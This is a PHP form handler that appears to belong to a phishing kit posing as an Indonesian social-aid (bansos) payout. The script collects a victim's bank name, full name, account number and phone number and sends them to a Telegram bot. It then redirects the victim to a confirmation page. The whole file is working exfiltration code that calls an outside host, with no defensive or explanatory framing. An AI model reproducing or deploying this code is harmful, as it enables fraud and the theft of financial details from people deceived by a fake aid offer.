
<?php
include "telegram.php";
session_start();
$nama_bank = $_POST['nama_bank'];
$nama_lengkap = $_POST['nama_lengkap'];
$nomor_rekening = $_POST['nomor_rekening'];
$nomor_handphone = $_POST['nomor_handphone'];

$_SESSION['nama_bank'] = $nama_bank;
$_SESSION['nama_lengkap'] = $nama_lengkap;
$_SESSION['nomor_rekening'] = $nomor_rekening;
$_SESSION['nomor_handphone'] = $nomor_handphone;

$message = " ━─━────༺DANA-BANTUAN-SOSIAL༻────━─━ 
├─────────────────── 
├• 𝗡𝗮𝗺𝗮 𝗕𝗮𝗻𝗸 : ".$nama_bank." 
├• 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ".$nama_lengkap." 
├• 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 : ".$nomor_rekening." 
├• 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : ".$nomor_handphone." 
╰─────────────────── 
━─━────༺DANA-BANSOS༻────━─━ ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konfirmasi.html');
?>
